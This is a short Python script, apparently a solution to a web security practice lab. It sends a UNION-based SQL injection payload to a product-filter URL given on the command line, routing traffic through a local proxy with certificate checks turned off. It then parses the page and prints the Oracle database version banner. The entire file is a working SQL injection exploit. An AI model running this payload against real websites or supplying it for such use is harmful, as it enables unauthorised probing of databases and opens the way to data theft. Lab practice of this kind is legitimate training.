# Oracle database 
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"


def exploit_sqli_version(url):
    sql_payload = "'+union+select+banner,+null+from+v$version--"
    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
    if "Oracle Database" in r.text:
        print("[*] Found the database version....")
        soup = BeautifulSoup(r.text,'html.parser')
        version = soup.find(text=re.compile('.*Oracle Database.*'))
        print(f"[+] The Oracle Databse version is: {version}")
        return True
    return False


if __name__ =="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} \"<url>\"")
        print(f"[*] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    
    print("[+] Dumping the version of database.....")

    if not exploit_sqli_version(url):
        print("[-] The software version is not found.")





